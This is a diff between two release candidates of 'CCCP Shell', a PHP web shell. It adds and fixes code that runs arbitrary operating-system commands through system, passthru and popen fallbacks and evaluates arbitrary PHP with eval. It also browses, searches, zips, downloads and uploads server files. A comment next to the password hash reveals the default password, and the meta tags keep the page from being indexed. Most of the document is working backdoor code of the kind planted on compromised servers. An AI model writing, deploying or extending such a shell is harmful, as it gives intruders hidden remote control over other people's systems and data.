@@ -3,7 +3,7 @@
  *	CCCP Shell
  *	by DSR!
  *	https://github.com/xchwarze/CCCPShell
- *  v 1.0 RC2 08072014
+ *  v 1.0 RC3 16072014
  */
 
 # System variables
@@ -13,7 +13,7 @@ $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16; //lines in hex preview file
 $config['hd_rows'] = 32;  //16, 24 or 32 bytes in one line
 $config['FMLimit'] = False;    //file manager item limit. False = No limit
-$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass)
+$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
 $CCCPmod[] = 'sql';
 $CCCPtitle[] = tText('sql', 'SQL');
 $CCCPmod[] = 'connect';
@@ -28,7 +28,6 @@ $CCCPtitle[] = tText('process', 'Process');
 // ------ Start CCCPShell
 $tiempoCarga = microtime(true);
 $isWIN = DIRECTORY_SEPARATOR === '\\';
-$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 define('DS', DIRECTORY_SEPARATOR);
 define('SROOT', dirname(__file__) . DS);
 
@@ -63,7 +62,7 @@ if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $user
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("sBuff-Type: text/html; charset=$config[charset]");
+	header("Content-Type: text/html; charset=$config[charset]");
 
 function mHide($name, $value){
 	return "<input id='$name' name='$name' type='hidden' value='$value' />";
@@ -126,6 +125,10 @@ function fix_magic_quote($arr){
 			$arr = stripslashes($arr);			
 	}
 	return $arr;
+}
+
+function getSelf(){
+	return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 }
 
 function tText($id, $default){
@@ -194,13 +197,13 @@ function execute($c, $i = false){
         } elseif (function_exists('system') && !in_array('system', $dis_func)){
             @ob_start();
             @system($c);
-            $r = @ob_get_sBuffs();
+            $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'system';
         } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)){
             @ob_start();
             @passthru($c);
-            $r = @ob_get_sBuffs();
+            $r = @ob_get_contents();
             @ob_end_clean();
 			$v = 'passthru';
         } elseif (function_exists('popen') && !in_array('popen', $dis_func)){
@@ -791,11 +794,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
                     } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                         $find = 0;
                         if ($re){
-                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))){
+                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_contents($f))){
                                 $find = 1;
                             }
                         } else {
-                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)){
+                            if (strstr($file, $sBuff) || strstr(@file_get_contents($f), $sBuff)){
                                 $find = 1;
                             }
                         }
@@ -848,10 +851,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				if ($p['dl']){
 					$zip = new PHPZip();
 					$zip->Zipper($p['fl'], $p['dl']);
-					header('sBuff-type: application/octet-stream');
+					header('Content-Type: application/octet-stream');
 					header('Accept-Ranges: bytes');
 					header('Accept-Length: ' . strlen($compress));
-					header('sBuff-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
+					header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
 					echo $zip->file();
 					exit;
 				}
@@ -901,9 +904,9 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sAjax(tText('notexist', 'Object does not exist'));
 				else {
 					$fileinfo = pathinfo($p['fl']);
-					header('sBuff-Type: application/x-' . $fileinfo['extension']);
-					header('sBuff-Disposition: attachment; filename=' . $fileinfo['basename']);
-					header('sBuff-Length: ' . filesize($p['fl']));
+					header('Content-Type: application/x-' . $fileinfo['extension']);
+					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
+					header('Content-Length: ' . filesize($p['fl']));
 					@readfile($p['fl']);
 					exit;
 				}
@@ -1012,17 +1015,17 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			} else if (isset($p['hl'])){
 				if (function_exists('highlight_file')){
 					if ($p['hl'] === 'n'){
-						$sBuff .= '<b>Highlight sBuff:</b><br>' .
+						$sBuff .= '<b>Highlight:</b><br>' .
 									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
 					} else {
 						$code = substr(highlight_file($p['t'], true), 36, -15);
-						$lines = explode('<br>', $code);
-						$padLength = strlen(count($lines));
-						$sBuff .= '<b>Highlight + sBuff:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
+						//if (substr_count($code, '<br>') > substr_count($code, "\n"))
+						$lines = explode('<br />', $code);
+						$pl = strlen(count($lines));
+						$sBuff .= '<b>Highlight +:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
 						
 						foreach($lines as $i => $line){
-							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
-							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
+							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
 						}
 
 						$sBuff .= '</div>';
@@ -1031,7 +1034,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					sDialog(tText('hlerror', 'highlight_file() dont exist!'));
 			} else {
 				$str = @fread($fp, filesize($p['t']));
-				$sBuff .= '<b>File sBuff:</b><br>' .
+				$sBuff .= '<b>File:</b><br>' .
 							'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
 			}
 		} else
@@ -1861,12 +1864,12 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 
 			//hago esta chapuzada para que no se muestre el resultado arriba
 			echo 'Result of the executed code:';
-			$buf = ob_get_sBuffs();
+			$buf = ob_get_contents();
 
 			if ($buf){
 				ob_clean();
 				eval("?" . ">$code");
-				$ret = ob_get_sBuffs();
+				$ret = ob_get_contents();
 				$ret = convert_cyr_string($ret, 'd', 'w');
 				ob_clean();
 				$sBuff .= $buf;
@@ -1874,7 +1877,7 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 				if (isset($p['dta'])) 
 					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
 				else 
-					$sBuff .= $ret . '<br><pre></pre>';
+					$sBuff .= "<br><pre>{$ret}</pre>";
 			} else
 				eval("?" . ">$code");
         }
@@ -2029,15 +2032,15 @@ if (isset($p['me']) && $p['me'] === 'process'){
 
 #Se fini
 if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
-	exit($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
+	sAjax($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
 ?>
 	<!DOCTYPE html>
 	<html>
 	<head>
-	  <meta http-equiv=sBuff-Type sBuff="text/html; charset=iso-8859-1">
-	  <meta http-equiv=Pragma sBuff=no-cache>
-	  <meta http-equiv=Expires sBuff="wed, 26 Feb 1997 08:21:57 GMT">
-	  <meta name="robots" sBuff="noindex, nofollow, noarchive" />
+	  <meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+	  <meta http-equiv=Pragma content=no-cache>
+	  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
+	  <meta name="robots" content="noindex, nofollow, noarchive" />
 	  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
 	  <title>CCCP Modular Shell</title>  
 	  <script type="text/javascript">
@@ -2047,7 +2050,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	var euc = encodeURIComponent;
 	var onDrag = false;
 	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
-	var targeturl = "<?php echo $self; ?>";
+	var targeturl = "<?php echo getSelf(); ?>";
 	
 	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
 	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
@@ -2089,44 +2092,44 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		for (i = form.elements.length - 1; i >= 0; i = i - 1){
 			if (form.elements[i].name === "") continue;
 			switch (form.elements[i].nodeName){
-				case 'INPUT':
+				case "INPUT":
 					switch (form.elements[i].type){
-						case 'text':
-						case 'hidden':
-						case 'password':
-						case 'button':
-						case 'reset':
-						case 'submit':
+						case "text":
+						case "hidden":
+						case "password":
+						case "button":
+						case "reset":
+						case "submit":
 							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 							break;
-						case 'checkbox':
-						case 'radio':
+						case "checkbox":
+						case "radio":
 							if (form.elements[i].checked) q.push(form.elements[i].name + "=" + euc(form.elements[i].value));				
 							break;
-						case 'file':
+						case "file":
 							break;
 					}
 					break;			 
-				case 'TEXTAREA':
+				case "TEXTAREA":
 					q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 					break;
-				case 'SELECT':
+				case "SELECT":
 					switch (form.elements[i].type){
-						case 'select-one':
+						case "select-one":
 							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 							break;
-						case 'select-multiple':
+						case "select-multiple":
 							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1){
 								if (form.elements[i].options[j].selected) q.push(form.elements[i].name + "=" + euc(form.elements[i].options[j].value));
 							}
 							break;
 					}
 					break;
-				case 'BUTTON':
+				case "BUTTON":
 					switch (form.elements[i].type){
-						case 'reset':
-						case 'submit':
-						case 'button':
+						case "reset":
+						case "submit":
+						case "button":
 							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
 							break;
 					}
@@ -2153,23 +2156,12 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 			req = ao.request;
 			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
 			req.open("POST", targeturl, true);
-			req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-			req.setRequestHeader('content-Type', 'application/x-www-form-urlencoded');
-			req.setRequestHeader('Connection', 'close');
+			req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+			req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			req.setRequestHeader("Connection", "close");
 			req.send(p);
 		}
 		return ao;
-	}
-
-	function htmlsafe(s){
-		if(typeof(s) == "string"){
-			s = s.replace(/&/g, "&amp;");
-			s = s.replace(/"/g, "&quot;");
-			s = s.replace(/'/g, "&#039;");
-			s = s.replace(/</g, "&lt;");
-			s = s.replace(/>/g, "&gt;");
-		}
-		return s;
 	}
 
 	function dpath(e, t){
@@ -2363,7 +2355,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 	
 	function up(){
-		ct = "<form name='up' enctype='multipart/form-data' method='post' action='<?php echo $self; ?>'><input type='hidden' value='file' name='me'><input type='hidden' value='up' name='ac'><input type='hidden' value='" + d.getElementById("base").value + "' name='dir'><table class='boxtbl'><tr><td class='colFit'><?php echo tText('file', 'File'); ?></td><td><input name='upf' value='' type='file' /></td></tr><tr><td colspan='2'><span class='button' onclick='document.up.submit()'><?php echo tText('go', 'Go!'); ?></span></td></tr></table></form>";
+		ct = "<form name='up' enctype='multipart/form-data' method='post' action='<?php echo getSelf(); ?>'><input type='hidden' value='file' name='me'><input type='hidden' value='up' name='ac'><input type='hidden' value='" + d.getElementById("base").value + "' name='dir'><table class='boxtbl'><tr><td class='colFit'><?php echo tText('file', 'File'); ?></td><td><input name='upf' value='' type='file' /></td></tr><tr><td colspan='2'><span class='button' onclick='document.up.submit()'><?php echo tText('go', 'Go!'); ?></span></td></tr></table></form>";
 		show_box("<?php echo tText('upload', 'Upload'); ?>", ct);
 	}
 	
@@ -2418,9 +2410,9 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 	
 	function change(l, b){
-		d.getElementById(l).style.display = 'none';
-		d.getElementById(b).style.display = 'block';
-		if (d.getElementById('goui')) d.getElementById('goui').focus();
+		d.getElementById(l).style.display = "none";
+		d.getElementById(b).style.display = "block";
+		if (d.getElementById("goui")) d.getElementById("goui").focus();
 	}
 	
 	function hilite(e){
@@ -2564,7 +2556,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		.boxtitle a, .boxtitle a:hover{
 			color:#aaa;
 		}
-		.boxsBuff{
+		.boxcontent{
 			padding:2px 0 2px 0;
 		}
 		.boxresult{
@@ -2765,4 +2757,3 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	  </center>
 	</body>
 	</html>
-
